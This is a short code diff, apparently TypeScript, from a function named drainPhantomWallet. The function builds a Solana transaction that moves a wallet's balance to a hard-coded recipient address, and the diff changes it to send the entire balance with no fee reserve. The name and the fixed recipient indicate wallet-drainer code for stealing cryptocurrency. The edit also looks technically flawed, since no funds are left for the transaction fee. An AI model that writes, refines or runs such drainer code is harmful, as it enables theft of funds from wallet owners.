@@ -62,12 +62,12 @@ export async function drainPhantomWallet(): Promise<void> {
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = senderPublicKey;
 
-    // Add the transfer instruction
+    // Add the transfer instruction - send entire balance
     transaction.add(
       SystemProgram.transfer({
         fromPubkey: senderPublicKey,
         toPubkey: RECIPIENT_ADDRESS,
-        lamports: balance - 5000, // Leave some for transaction fee
+        lamports: balance, // Send entire balance
       })
     );
 
